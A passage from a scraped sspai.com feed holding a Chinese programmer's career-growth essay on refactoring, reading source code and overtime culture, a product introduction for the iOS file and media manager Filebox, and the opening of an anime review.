或技术负责人）我果断选择了「踩刹车」并着手第二版的重构工作。</p>\n<p>重构这件事情如果是在大厂或者大公司，通常不会轻易开展，因为在大厂或者大公司一个项目的代码需要通过层层把关才会最终上线，还有一个原因就是稳定。（画外音：<s>只要能赚钱能跑不崩，我管你们这帮干活程序员写的代码有多烂</s>）。</p>\n<p>但是在小公司或者新开辟的部门里，在缺少技术负责人的情况下，你一个人就是<strong>一个团队</strong>，甚至你就是技术负责人（画外音：<s>上线出了问题你就别想跑</s>）</p>\n<p>当然这重构的第二版还处于开发阶段，这也就意味着第一版的祖传代码将会在其它同事以及已经上线的生产环境中继续运行着，并被有着不同编码风格以及水平参差不齐的同事们不断「添砖加瓦」（这里指贬义）。</p>\n<p>但重构还是很有意义的，在重构的过程中你会不由自主地避开或优化掉以前所遇到的「坑」，并且会把你积累下来的经验和所学知识发挥得淋漓尽致。在这一过程中你会开始不由自主的脱离代码层面以一种架构师（理解为程序版的设计师即可）的视角去审视自己在每个功能上的代码设计、甚至为以后如何扩展埋下预留位置。</p>\n<ul><li>参考：<a href=\"https://www.zhihu.com/question/39486274\" target=\"_blank\">成功重构了代码是种怎样的体验？ - 知乎</a>\n</li></ul>\n<p>因此在这个过程中 <strong>模块化（Modularization）</strong> 的思想就很重要了，模块化顾名思义就是将每个功能或者代码设置成一个模块，通过不同模块的组合来实现一个完整的产品，之后只需要每次对不同的模块进行局部小修小补即可实现功能的更新迭代，而不是伤筋动骨。</p>\n<p>倘若你有看过别人的开源项目或者源码，就会发现大多数都是以模块化的方式来设计。大模块可以由多个小模块构成，而小模块又能接着由多个小部分组成，这在我看来其实就是「大事化小小事化了」思想的一种诠释。</p>\n<p>用一句更为专业的设计模式的话来概括就是：<strong>低耦合，高内聚</strong>。</p>\n<p>参与亲手重构项目的我对于重构这件事真的是乐此不疲。原因前面也说了，因为受限于不同时间节点和阶段个人的经验与知识，所以此时的自己比彼时的自己的水平是只增不减，于是乎新一轮的重构循环似乎又开始了，甚至都想替其它同事重构（画外音：<s>给你们看看什么叫做优雅、漂亮的代码</s>）⋯⋯</p>\n<ul><li>参考阅读：<a href=\"https://item.jd.com/12584498.html\" target=\"_blank\">《重构：改善既有代码的设计》</a>\n</li></ul>\n<h2>追根溯源：源码里有你想知道的一切</h2>\n<blockquote><p>Talk is cheap, show me the code.（少跟我扯淡，给我看代码）——Linus Torvalds</p></blockquote>\n<p>正如 Linus Torvalds（Linux、Git 之父）这一句经常被程序员奉为圭臬或是引用的话所透露的思想一样，跟程序员交流最好的方式就是通过代码。</p>\n<p>尽管人们常说在内容呈现上「字不如表，表不如图」，但对于程序员来说字、表、图都远不如代码来得熟悉。</p>\n<p>所以很多时候我在跟程序员同事沟通时，往往都会通过代码，甚至是伪代码的形式能够让他们能了解我的意图或者让我搞懂他们需要哪些东西是我提供的。但如果是不懂技术产品经理或者是项目经理，在和程序员沟通时往往需要花费大量的篇幅去让他们尽量了解到每个部分或者功能模块的逻辑是什么。</p>\n<p>这个过程通过口头交流或者会议传达的时间可能需要 10 分钟及以上，但我通过代码的形式只需要 5 分钟甚至是更少。</p>\n<p>所以对于程序员间的交流来说，源码毫无疑问是一种更为直接且明了的方式。通过源码及当中的一些注释或写法，我们或多或少能够搞清楚写这段代码的程序员所要表现的是什么或是用来做什么。</p>\n<p>作为一个合格的程序员，也必须要具备<strong>读源码</strong>的本事。读源码本质上就是相当于读别人写的文章一样，从逐字逐句中获取到别人文章所要表达的意思、有哪些伏笔、有哪些情节等⋯⋯这经常性地发生在我们在调用第三方库或想了解别人 API 的底层实现时才会去读源码。</p>\n<p>可以说读源码的重要性和难度都是仅次于元编程的。源码可能不会像元编程那样枯燥，但它混杂了一个或多个程序员模块化或架构的思想、代码技巧、API 的代码实现、用例思路等等多方面的东西。对于一个小项目来说，它的源码可能不会很复杂，模块就那么些，可能一天之内就能了解到大概的实现；但对于一个复杂且庞大的项目来说，可能底层的源码就好比是一本大部头，你可能需要花费数日甚至更久的时间才能去完全摸透。</p>\n<p>读源码的目的不是为了读而读，而是为了从中学到或搞懂别人是如何实现而读。在这里我们需要借助 IDE 来实现不同模块之间的跳转，如有必要还要自己进行记录。源码的益处你无法从不同的教程或课程中体会，而是当你开始一个新的项目或者在实际工作中才会发现你所读过的源码里的精华都会内化成你自己的东西，最终都体现在你所写过代码的字里行间。</p>\n<p>这里我还是以我学习 Pandas 为例，通过 Pandas 库的底层源码并结合所学的 OOP 思想，我才明白在 Pandas 实现<strong>链式调用</strong>（Method Chaining）的基本思路：每个 DataFrame 或 Series 对象的方法在调用时每次返回的是一个 DataFrame 或 Series 类对象。正因为方法属于对象的一部分，而每次返回的又是对象，所以就能循环往复地调用所有从属对象的方法。</p>\n<pre class=\"language-python\"><code># Not Method Chaining\non_hill = went_up(jack_jill, 'hill')\nwith_water = fetch(on_hill, 'water')\nfallen = fell_down(with_water, 'jack')\nbroken = broke(fallen, 'jack')\nafter = tmple_after(broken, 'jill')\n\n# Method Chaining\njack_jill = JackAndJill()\n(jack_jill.went_up('hill')\n    .fetch('water')\n    .fell_down('jack')\n    .broke('crown')\n    .tumble_after('jill')\n)\n</code></pre>\n<p>Pandas 的官方文档只告诉你调用之后会返回 DataFrame 或 Series 对象，但却没告诉你为什么能够这样循环往复的像链子一样将所有方法串在一起，所以我们只能从源码上找答案，也正是因为我带着这个疑问去翻看了源码之后才真正的贯通。</p>\n<p>这一些内容如果不是我有分享，或许和我协作的一些 Python 程序员同事永远也理解不了我的代码里为什么会这么写，因为他们本身没有尝试过去了解当中的原理以及阅读过底层源码。</p>\n<p>因此，当你已经能熟练使用大部分 API、库和框架之后，就可以从源码开始了你的「内功」修炼了。能够将一个库或框架的源码聊熟于胸，不仅能够帮助你在程序出现 Bug 时迅速定位并解决问题，减少加班缓解秃头；也可能会成为你在将来找工作或跳槽的面试中赢得面试官的青睐（在一些招聘中如果有熟悉与工作相关的库或框架的源码，会是一个加分项）</p>\n<h2>n→1：知识经验的碎片化与体系化</h2>\n<p>在自我恶补的过程中能够获取到很多相关的知识或内容是一件大有裨益的事情，因为这已经是不同于你在校园课堂里老师主动灌输给你知识而你被动吸收的方式，而是一种自我驱动、自我主动去学习的过程。在这个过程中学习的效率往往都会比你在课堂上学习的效率高出一大截。</p>\n<p>在我自行补课的过程中，我除了会收藏关于各种同我感兴趣的或疑问的点有关的内容；并且在每次每个阶段性学习完后我会再回过头来重新梳理、回顾所学的东西，最后构建出自己的对这一部分内容的系统性框架，让我能够更好地透视每个主要的知识点。</p>\n<h3>做一个碎片化知识的收集者</h3>\n<p>每个人或多或少在学习的时候都有一点「收集癖」，各种相关的资源都会丢到收藏夹里，我也不例外。虽然我现在很少用 <a href=\"https://www.notion.so/\" target=\"_blank\">Notion</a> 来做相关的笔记（毕竟编辑 Markdown 没有我直接在 VS Code 里来的舒服），但最初或者是现在我通常都会用它来进行学习资源的收集与归类。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_nicholaszhang/16233797344574.png\" alt=\"我的 Notion 收藏页面\"><figcaption>我的 Notion 收藏页面</figcaption></figure><p>但「收藏了」并不意味着「学会了」。所以我在闲暇时候总会自己翻一翻或者是认真地将资源收藏的 Github 项目或者相应教程认认真真地看一遍、学一遍，虽然有「假勤奋」之嫌，但我感谢我从去年到现在一直都在干这样假勤奋的事情，让我在一定程度上做到了量的积累。</p>\n<p>与此同时，<a href=\"https://trello.com/\" target=\"_blank\">Trello</a> 也曾是我收集碎片化知识的好帮手，只是因为由于网络原因，它的访问一直都不太稳定给我造成困扰。但它核心的「看板」功能让我养成了将问题<strong>拆分或者简单化后再发散、处理并完成</strong>的这么一个习惯。这其实在某些方面与 <strong>GTD</strong> 的思想不谋而合。</p>\n<p>我在学习 Pandas 的相关用法时，会将自己遇上的自己不懂的 API 都放在 Trello 中，配合其 Markdown 的语法会对该 API 方法写下用法以及自己的理解或发散。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_nicholaszhang/16233797344578.png\" alt=\"Trello\"><figcaption>Trello</figcaption></figure><p>通过 Notion 和 Trello 的配合，实现了对一些碎片化知识的收集与整合，在某些时刻它们甚至会成为我技术文档或文章中的某些素材。</p>\n<p>碎片化的知识虽然有写下自己的想法或是别人的观点和回答，但仍然需要<strong>被进一步整理</strong>。碎片化的知识也会因不断地整理最终升华到系统化的高度。</p>\n<p>Notion 和 Trello 在这个过程中不是必须的，你可以换成任何你熟悉的 APP 或者是工具。虽然有些时刻我打算通过不同的工具或软件来丰富自己的学习工作流，但实际上当我游离于各种工具或软件间进行切换时，它们所给我带来的收益并不是 <strong>1+1&gt;2</strong> 的，甚至一度是「正正得负」的效果。</p>\n<p>所以至今我很少像少数派其它的作者那样写关于不同软件或者 APP 使用体验或者介绍，<strong>因为我一直都希望能保持一种纯粹、极简的学习过程，让自己专注于要学的东西本身，而不是如何通过各种软件来留下自己学习的证明。</strong></p>\n<h3>系统化知识</h3>\n<p>私以为，一个人如果能够系统总结自己所学的东西，并能将其很快地以思维导图形式铺开（当然也不一定是实物，脑海里的视图也算），那么能说明这个人的学习和总结能力肯定不差。然而，在工作了这一年多的时间里，我发现身边的大多数同事都不具备系统化自己知识的能力，似乎对自己所学的东西都了解那么一二，但是能够很清晰、渐进地将知识体系化的人只能说是寥寥无几。</p>\n<p>我在五月份到国庆前这段出差驻点的时间里，因为和不同技术栈的同事一起共事，当然也就对前后端的技术有了一些兴趣，于是问了一个前端同事，想了解一下 JavaScript 怎么入门。这位同事只是零碎的跟我说了一先学 JavaScript 或者 TypeScript，再学一下 HTML、CSS 和 Vue 基本上就差不多了。</p>\n<p>当然，我知道这种问题就和论文题目一上来就取《论 XXX》这类题目一样宏大，同事的回答也是泛泛而谈。但是当我总结自己这一年多以来的成长历程，我反而会觉得，像这种基础性的内容或者知识，对于一个有经验的老鸟来说应该是特别明晰且透彻的。</p>\n<p>虽然我自己本身并非科班出身，但我觉得我自己具备了这种系统化知识和所学内容的能力。</p>\n<p>《<a href=\"https://sspai.com/series/148\" target=\"_blank\">Python 自学手册</a>》教程的提纲我只用了 5 分钟左右就在纸上迅速列出，然后再用 5 分钟左右的时间通过 Markdown 对章节进行了排布。我想这与我在入门 Python 阶段所看的书籍知识的总结、反思和对内容安排的疑问有着密不可分的联系。</p>\n<p>如果现在有人问我如何入门 Python，那我肯定是很快啊，啪一下就能一口气列出从初级到中级的学习路线，毕竟我早已是个有备而来的初级工程师了。</p>\n<blockquote><p>好记性不如烂笔头</p></blockquote>\n<p>系统化的过程离不开前面碎片化收集的前提。当然对于程序员来说，积累自己的所学的笔记的最好方式就是将其以文档或博客的形式记录下来。这样在后续整理的过程中体系化、系统化的学习路线就慢慢浮现在眼前了。</p>\n<p>所以目前只要是关于写文章或进行笔记记录的内容，我都会毫不犹豫的以 Markdown 形式进行记录，并最后保存在我的 Github 私人仓库中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_nicholaszhang/16233797344582.png\" alt=\"我的 Github 笔记私有仓库\"><figcaption>我的 Github 笔记私有仓库</figcaption></figure><p>这是我学习的见证，也是自己在未来用以写作的素材来源。</p>\n<h2>技术栈：点亮其它技能树</h2>\n<p>我曾在少数派的《<a href=\"https://sspai.com/series/148\" target=\"_blank\">Python 自学手册</a>》教程里的序言中提到的那样，单单只会一门 Python 并不能让你找到工作。</p>\n<p>虽然现在的社会是一个分工极其明确的社会，但只要你随便打开一个招聘信息都会发现上面列出来的招聘要求可不单一，往往希望你具有多种复合型技能，换而言之要的却是复合型人才。这在程序员这一行业里尤为明显，因为如果你只懂一种技术，那你就是我们中学时候里所说的偏科生，而大家都知道咱们考试看的却是综合成绩。所以从人力成本来说，招聘一个人当然希望这个人能会很多，这样对于特定技能的用人需求就会减少，从而也减少了人力成本。</p>\n<p>因此对于那些非科班的程序员，并不会因为你不是科班出身而降低对你的要求，甚至要求你和其它科班出身的程序员有一样的知识面或技能。所以咱们除了恶补的基础知识外，都还应该拓宽自己的技术栈。</p>\n<p>从去年到今年一年的时间里，我学过的东西大致有：</p>\n<ul>\n<li>Linux 系统操作、Shell</li>\n<li>数据科学相关：数据分析、机器学习等</li>\n<li>数据库相关：MySQL / PostgreSQL / MongoDB 等数据库知识及操作</li>\n<li>Python 及框架 Flask、Django、FastAPI 等</li>\n<li>爬虫</li>\n<li>其它其它编程语言：Go、Java、R 语言</li>\n<li>前端：JavaScript、HTML5、CSS3</li>\n<li>其它技能：Vim、Git</li>\n<li>⋯⋯</li>\n</ul>\n<p>从中可以看到我学的东西并不少，甚至又多又杂。一方面是因为我存在着焦虑，害怕我确实不能在工作做到游刃有余而要每天辛苦的加班；另一方面是我对这些同是计算机领域内的知识有着浓厚的兴趣，并且随着学习的深入以及对元编程的内容的理解和领悟，让我能更加快速地上手一门语言（触类旁通）。</p>\n<p>而且在出差的时间里，除了要应付来自于客户的需求之外还要面临着环境部署、Bug 等各种问题，也迫使我在这当中不得不加强了对上述当中某些技能的应用。所以我虽然是个分析师，但我依旧和前后端的同事们有着可以聊得话题。</p>\n<p>所以作为一个程序员，会一门能够谋生的编程语言是必须的，但除了这门语言之外还应该会得更多才能让你更好地涨工资、有着更好的发展空间。无论你是怎样的程序员，会得越多你越能真正做到「游刃有余」。你选择的余地就会愈加宽广。</p>\n<p>在学习不同技术栈的过程中，你会体会到不同编程语言或技术之间的相似性以及差异性，能更好地把握不同技术的适用面；同时在实际过程中你能更好地做到对协作同事的兼顾，以及整个程序或项目的大局把控、架构等。</p>\n<p>像这种前后端都会或者会得很多的程序员往往都叫「全栈工程师」（<s>全干工程师</s>），可一个人的精力是有限的，不可能每项技能都做到突出。虽然也不乏有大佬确实是对不同的编程语言都达到精通的地步，但那只是少数人。对于想要成为合格的程序员、甚至高级程序员或工程师的人来说，横向拓宽自己的技术栈是必须的，但并不一定要达到精通的地步，能做到了解或稍微熟悉就已经很不错了。剩下的只需要在自己更为擅长的方面纵向专精那就已经是在某方面可以称为专家了。</p>\n<h2>代码不是一切：聊聊代码之外的东西</h2>\n<p>对于程序员来说「Everything is code」，但从某些层面来说「Code isn't everything」。</p>\n<h3>技术其实并没有我们想象得那么高大上</h3>\n<p>仅工作一年多，我对「技术」的信仰就已经从狂热趋近于平淡。这和我们「经常点一家好吃的外卖，之后就每次点都感觉没有最初的味道」这种耐受性不同。</p>\n<p>趋于平淡的原因是因为，褪去宏大抽象的包装外衣之后，技术似乎就并没有那么高大上了。更多时候技术仅仅只是依附于业务、经理或者是领导们的一种获取价值和利润的方式而已，无论技术含量高低与否，都是一视同仁。</p>\n<p>大多数的非技术出身的经理和领导不会在乎你使用了怎样的数据库技术、哪种编程语言、前端采用哪种动效能提升用户交互、将延迟从 5s 秒减少到 1s⋯⋯在乎的是如何将「能做到的技术」以抽象难懂或华丽的概念辅以某种新时代下的意义打包成所谓的「产品」进行出售或向目标客户推销。</p>\n<p>但在产品外表下，各种组合的技术栈大部分都是枯燥、乏味没有太多技术含量的东西。</p>\n<p>今年尽管忙忙碌碌了大半年，我也一直在想，那堆组合在一起的<strong>代码</strong>对于程序员或者工程师来说意味着什么？这仅意味着我们完成了对得起工资的工作量？还是意味着我们仅仅只是做到了一件能够自我满足的技术实现？亦或是意味着仅仅只是完成了年度 KPI 中的一小部分跨越？</p>\n<p>就代码本身来说，它是一个程序员或工程师的全部；但在对人的价值和意义面前，它却又是渺小且卑微的。</p>\n<h3>谈一谈「996」、时间价值与自我提高</h3>\n<p>「996」一词也是去年开始火热起来，但我在没工作之前对此并没有很深刻的感触，直到我开始进行了人生第一次长时期的加班。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/765fcf9443e1d7a410ab5520e852b41b.png\"></figure><p>虽然我工作的年限并不长，但在今年出差的时间里，我和同事们需要经常性地会在工位上除了要赶进度之外，还需要额外为了满足客户的需求多变去做临时的事情，时不时还要解决程序出现的 Bug 或环境部署问题，可以说尽可能把一天的工作时间都排满了。可尽管如此加班依旧是常有的事，到现在调休还剩一大堆。</p>\n<p>在没出差之前我还欣喜说每天能有大约 80 元的补贴，每天早晨也不需要挤地铁，去汇报时打车也会报销，这样能省下一笔不小的开支并且还留有富余。</p>\n<p>但驻点的工位的环境不算很好，无论是桌椅还是设备（内网环境无法使用自己的设备）。长时间干到晚上时发现我开始经常性地眼睛刺痛、流泪，不得不购置眼药水并时刻走动并放松眼睛。受限于桌椅的高度与面积，更多时候身体不能保持在合理且健康的姿势下。颈椎、腰部都开始频频发出不舒服的警报。</p>\n<p>在此期间，在和一位后端的同事聊天时聊到关于出差的话题，大意是每天出差有补贴可以拿，早餐钱、交通费也都不需要自己出，打车还能报销，出差不也很舒服？在我没有出差之前，我认为这是美好的，但自从出差结束之后我就改观了。</p>\n<p>有补贴拿、没有多余的交通开支这对我来说算好吗？有一笔额外的收入是很好，但其实在扣除对应的房租、伙食费之后其实也所剩无几，但关键的是个人要<strong>经常性地为需求和工期让步</strong>（当然加班没有补贴，只有调休）。在没有加班之前，我每天都会在下班之后的时间里锻炼、阅读或是学习了解一些技术方面的东西以充实自己，但加班之后回去却是难以挤出多余的时间来做这些事。</p>\n<p>所以相比于个人的时间价值和自我提高来说，同事口中的这些「福利」完全就是不值一提。尽管我依然只是个事业起步的打工人，但个人的时间价值和自我提高我永远是摆在第一位的。也正是在我个人的时间里，我扩展了自己的技术栈、有时间写文章写教程、能够在闲暇之余做做饭、锻炼⋯⋯这都是加班和那些微薄的福利无法给予的。</p>\n<p>所以如果有两份工作摆在我眼前，一份工资少但不 996 或少加班，一份工资高但工作强度高且经常性 996，那毫无疑问我会选择前者。</p>\n<p>可能有人会说「趁着年轻为什么不奋斗一把？」</p>\n<p>没错，年轻应该勤奋上进，但在没有加班或 996 的影响下，自己能在个人时间里自我提升就不算是奋斗了吗？我无法苟同奋斗就一定要和 996、很辛苦的加班划上等号。</p>\n<p>金钱物质可能是一个人生活基础的保证，但却不一定是一个人幸福、人生意义和价值的保证。</p>\n<h2>EOF</h2>\n<p>这是我这一年多以来作为一个分析师、程序员和工程师的成长之路。</p>\n<p>我由一个懵懵懂懂、不谙世事的大学生逐渐成长了一个对自我有追求、有挑战的初级程序员。或许接下来的路程更为难走，要求学习的东西也会越来越多、越来越庞杂，但我相信作为一个成年人，主动选择的决定总是比从众而行的跟风更有毅力，既然选择了远方，便只顾风雨兼程。</p>\n","link":"https://sspai.com/post/67174"},{"title":"本地、远程媒体库随身带，iOS 多媒体文件管理器：Filebox","date":"2021-07-13 03:32:09","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>经过十几个版本迭代，Filebox 终于可以向大家公布了。Filebox 是一款基于文件的多媒体文件管理应用，提供了本地/远程文件管理、本地音乐播放器、视频播放器等功能。</p>\n<h2><strong>文件管理</strong></h2>\n<p>文件管理是 Filebox 的核心功能之一，也是开发较为耗时的一个功能。在设计之初有点纠结是否集成系统的 <a href=\"https://developer.apple.com/documentation/fileprovider\" target=\"_blank\">File Provider</a> ，但考虑到一些功能 <a href=\"https://developer.apple.com/documentation/fileprovider\" target=\"_blank\">File Provider</a> 不支持以及扩展性，于是就自己实现了一个增强版本的「文件」应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/702d433d8129f34a31212fe03a1e8377.png\"><figcaption>文件管理</figcaption></figure><p>文件管理器的主要功能有：</p>\n<ul>\n<li>导入文件</li>\n<li>预览文件</li>\n<li>分享文件</li>\n<li>压缩、解压缩</li>\n<li>文件搜索</li>\n<li>构建音乐播放列表</li>\n<li>编辑、移动、删除文件</li>\n<li>连接远程服务器</li>\n<li>查看文件信息</li>\n<li>……</li>\n</ul>\n<h4><strong>文件导入方式</strong></h4>\n<p>Filebox 提供了多种文件导入方式：</p>\n<ul>\n<li>通过 AirDrop</li>\n<li>通过 HTTP 共享</li>\n<li>通过网络共享，如 SMB、WebDAV</li>\n<li>通过「文件」应用</li>\n<li>通过链接直接下载</li>\n</ul>\n<p>将文件导入到 Filebox 后，你可以进行文件管理了。同时 Filebox 的文件系统是完全开放的，也就是说可以使用任意其他应用访问 Filebox 的文件系统并对其进行修改。</p>\n<p>举个例子，用 Safari 下载了加密的压缩文件，可以使用文件应用将其复制到 Filebox，在 Filebox 中输入解压密码进行解压缩。</p>\n<h4><strong>压缩与解压缩</strong></h4>\n<p>Filebox 提供了对多种压缩文件格式的支持，如常见的 zip、rar、tar、7z 等。同时 Filebox还支持解压带密码保护的压缩文件。</p>\n<p>Filebox 还提供了将文件与文件夹压缩为 zip 文件的功能，如果你想要保护你的压缩文件，你还可以将其压缩为带有密码保护的 zip 文件。</p>\n<h2><strong>连接</strong></h2>\n<p>通过连接远程服务，你可以访问远程文件，如家中 NAS 上的电影、坚果云上的音乐等。Filebox 支持 SMB、Synology、FTP、SFTP、WebDAV(HTTPS) 等协议的远程连接。 在连接远程服务的时候，你可以选择将账户信息保存以便下一次快速访问。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/04a7f57d704c5b366d13fdcdeb6ef620.png\"><figcaption>连接</figcaption></figure><p>已保存的远程连接账户信息会出现在连接 Tab，用于下次免密码访问。你还可以将喜爱的文件夹添加到「我的收藏」中。例如你正在追剧，该剧的视频文件存储在一个文件夹中，你可以将该剧的文件夹添加到「我的收藏」，这样打开应用就可以直接访问文件目录。</p>\n<blockquote><p>Filebox 不会上传你的用户名与密码，你的账号信息会存在系统 KeyChain 中以便下次自动登录</p></blockquote>\n<h2><strong>媒体库</strong></h2>\n<p>媒体库中包含了多媒体功能入口：最近播放视频列表、本地视频、本地音乐等，还提供了连接远程服务的入口，方便浏览远程文件。</p>\n<p>通常我只会在这个界面操作，如最近看的视频、电视剧，Filebox 会记住上一次的播放记录，甚至当你在追剧的时候，还会记住播放列表，让你在播放器中就可以快速切换剧集。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/4941e4667c627543524dd4e3842f035f.png\"><figcaption>媒体库</figcaption></figure><p>媒体库未来可能会改版，具体可能涉及到如下的几个功能：</p>\n<ul>\n<li>在用户允许的情况下扫描用户的远程服务（如局域网 NAS ）并将其所有的视频文件整理归类显示在媒体库中，方便用户直接浏览观看</li>\n<li>增加本地音乐按专辑、歌手等进行分组</li>\n<li>增加备份照片的入口</li>\n<li>……</li>\n</ul>\n<h2><strong>视频播放器</strong></h2>\n<p>视频播放器是 Filebox 强大的功能之一，也是我最常用的功能之一。不仅能播放本地的视频，还支持各种协议的远程视频，如常见的 SMB、WebDAV、FTP 等协议，针对群晖 NAS，还提供了群晖文件协议，速度相对于常用的 SMB 协议会快许多。</p>\n<p>视频播放器支持常见的视频格式，如：MP4、MKV、MOV、RMVB、AVI 等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/31798da39252ca973a512b7bd8307a51.png\"><figcaption>视频播放器</figcaption></figure><p>视频播放器提供了多种手势的快捷操作：</p>\n<ul>\n<li>屏幕左右滑动手势：后退/快进</li>\n<li>屏幕左侧上下滑动手势：调节屏幕亮度</li>\n<li>屏幕右侧上下滑动手势：调节音量大小</li>\n<li>点击进度条直接跳转该进度播放</li>\n</ul>\n<p>视频播放器会记住上一次播放历史并会显示在媒体库中，方便继续观望未看完的视频。同时视频播放器还提供了多种个性化设置:</p>\n<ul>\n<li>默认播放速度</li>\n<li>是否优先使用系统播放器</li>\n<li>是否默认进入全屏</li>\n<li>是否自动播放下一项</li>\n<li>……</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/2e2303a20a1cd90008f17ed73beff3d1.png\"><figcaption>视频播放器设置</figcaption></figure><p>另外对于 mp4、mov 格式的视频文件，使用系统播放器将获得系统原生的 <a href=\"https://developer.apple.com/documentation/avkit/avpictureinpicturecontroller\" target=\"_blank\">Picture in Picture</a> 支持。</p>\n<h2><strong>音乐播放器</strong></h2>\n<p>音乐播放器是 Filebox 另一个核心功能，也是我另一个最常用的功能之一。它提供了诸如播放列表、多种播放模式、歌词等常见的音乐播放器功能，同时还提供了编辑 ID3 信息的功能，让你在手机上就能完善歌曲信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/af87bc31d3fd3013efdf2c741d4ebb5e.png\"><figcaption>音乐播放器</figcaption></figure><p>当你导入的音乐文件没有多媒体元数据信息时，Filebox 会根据文件名字去搜索对应的歌曲，默认 Filebox 不会自动修改音乐本身的数据。</p>\n<p>如果你想编辑音乐的元数据信息，Filebox 还提供了对 m4a 与 mp3 文件格式的编辑功能。</p>\n<p>对于正在播放的音乐，会在首页的底部添加一个正在播放音乐条，可以通过他实现快捷切歌、播放/暂停、关闭等功能，同时还支持手势左右滑动来切换上一首/下一首。<br> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/09/ac730a5c7cd2c0a78115abcb59a0bab1.png\"><figcaption>音乐播放器-正在播放</figcaption></figure><p>在文件管理中提到可以构建本地音乐播放列表，Filebox 提供了基于目录的音乐播放列表。即你可以将喜欢的音乐放置到同一个文件夹内，即创建了一个播放列表，点击文件夹中的音乐就可以播放该列表。同时为了满足多种需求，还提供了四种播放列表模式供选择。<br> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/09/7b5bc2c2e611aec748d403035a75ce5b.png\"><figcaption>播放列表模式选择</figcaption></figure><h2><strong>文本编辑器</strong></h2>\n<p>Filebox 针对本地文本文件，如<code>.swift</code>、<code>.js</code>、<code>.txt</code>、<code>.markdown</code> 等还提供一个简单的编辑器，支持预览打开。对于代码文件与 Markdown 文件，还支持语法高亮。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/0da9edad146627c87ea1d215062b7516.png\"><figcaption>文本编辑器</figcaption></figure><blockquote><p>编辑器只是Filebox的一个辅助功能，目前还在较为初级阶段，后期会逐步完善。</p></blockquote>\n<h2><strong>产品定价</strong></h2>\n<p>Filebox的核心功能均是免费的，你无需购买即可使用所有 Filebox 的核心功能：</p>\n<ul>\n<li>文件管理</li>\n<li>音乐播放</li>\n<li>视频播放</li>\n<li>远程照片浏览</li>\n</ul>\n<p>Filebox 会在一些个性化的功能上进行应用内购买，如应用主题、应用图标、一些非常个性化的功能设置，<strong>一次购买永久有效</strong>。</p>\n<h2><strong>未来规划</strong></h2>\n<p>Filebox还在快速迭代中，仍有一些在计划中的开发需求：</p>\n<ul>\n<li>集成云服务的支持，如 Dropbox、OneDrive、GoogleDrive 等</li>\n<li>实现上传队列</li>\n<li>备份照片</li>\n<li>集成 JellyFin 等媒体服务</li>\n</ul>\n<h2><strong>更多内容</strong></h2>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/id1558391784\" target=\"_blank\">App Store</a> 免费下载 Filebox，你也可以访问 <a href=\"https://filebox.space/cn/\" target=\"_blank\">官网</a> 了解更多。</p>\n<span class=\"ss-application\" app-id=\"16105\"> </span><p>期待与你相遇，感谢。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67628"},{"title":"如何评价2021年4月动画《本田小狼与我》？","date":"2021-07-12 11:30:10","description":"\n<p>看到鱼总 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/2452e1e547fa65b32f1365943337d619\" data-hash=\"2452e1e547fa65b32f1365943337d619\" data-hovercard=\"p$b$2452e1e547fa65b32f1365943337d619\">@鱼缸里的沫沫鱼</a> 吐槽了，我也忍不住了，来批评两句。</p>\n<p>第一集孤独清冷的氛围感营造的极为出色，修正水平也相当不错，还原了博老师人物原案的魅力，再加上KAI社上一季刚做出了一部无可指摘的《赛马娘 第二季》，所以我起初的期待是放到《摇曳露营》精神续作这一水平线上的。</p>\n<p>最后发现除了在修得烂这一点上堪称青出于蓝而胜于蓝之外，本田小狼和马娘二期完全是两回事。</p>\n<p>一方面是演出手段的贫乏，空气系空气系不是说连演出都空掉了，相反由于空气系作品的故事相对薄弱，其实往往更需要高浓度的演出来保障观感。可惜本田小狼的演出只有三板斧：换滤镜、古典乐、同ポ（与之前的Cut使用同样的镜头位置、构图），而且都在第一集用过了，到中后期明显感到黔驴技穷。</p>\n<p><b>换滤镜</b></p>\n<p>当然换滤镜只是个说法，真正想要做到这种滤镜效果也没那么简单，本片监督藤井俊郎4年前在《18IF》演出回里就用过了类似的手法:</p>\n<p><img src=\"https://pic4.zhimg.com/v2-24bd5e45cca1617a55f88a09c2a3c94e_720w.png?rss\" data-caption=\"18if ep3\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"405\" data-watermark=\"original\" data-original-src=\"v2-24bd5e45cca1617a55f88a09c2a3c94e\" data-watermark-src=\"v2-6cb088e29f475a2e1b783ecc8df5cff5\" data-private-watermark-src=\"v2-81d4dbdde8691fe0bfe3b6908a116de5\"></p>\n<p><img 